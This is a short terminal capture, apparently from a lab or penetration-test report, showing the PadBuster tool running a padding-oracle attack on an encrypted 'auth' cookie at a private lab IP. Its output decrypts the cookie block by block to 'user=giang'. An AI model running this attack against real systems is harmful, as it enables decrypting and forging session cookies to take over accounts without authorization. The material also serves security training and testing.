```zsh
$ padbuster http://10.10.10.18 y93eOCigcmLxD58C7qjwjJ0BgPX%2BJgBP 8 -cookies auth=y93eOCigcmLxD58C7qjwjJ0BgPX%2BJgBP

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 1138

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 2 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     1133    N/A
2 **    255     200     15      N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (254/256) [Byte 8]
[+] Success: (231/256) [Byte 7]
[+] Success: (60/256) [Byte 6]
[+] Success: (239/256) [Byte 5]
[+] Success: (177/256) [Byte 4]
[+] Success: (67/256) [Byte 3]
[+] Success: (87/256) [Byte 2]
[+] Success: (74/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): f10f9f02eea8f08c
[+] Intermediate Bytes (HEX): beaebb4a15c71b03
[+] Plain Text: user=gia

Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
*** Starting Block 2 of 2 ***

[+] Success: (117/256) [Byte 8]
[+] Success: (12/256) [Byte 7]
[+] Success: (83/256) [Byte 6]
[+] Success: (20/256) [Byte 5]
[+] Success: (255/256) [Byte 4]
[+] Success: (97/256) [Byte 3]
[+] Success: (145/256) [Byte 2]
[+] Success: (105/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 9d0180f5fe26004f
[+] Intermediate Bytes (HEX): 9f689904e8aef68a
[+] Plain Text: ng

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=giang

[+] Decrypted value (HEX): 757365723D6769616E67060606060606

[+] Decrypted value (Base64): dXNlcj1naWFuZwYGBgYGBg==

-------------------------------------------------------

```

This example comes from [here](../Pentest%20Report.md)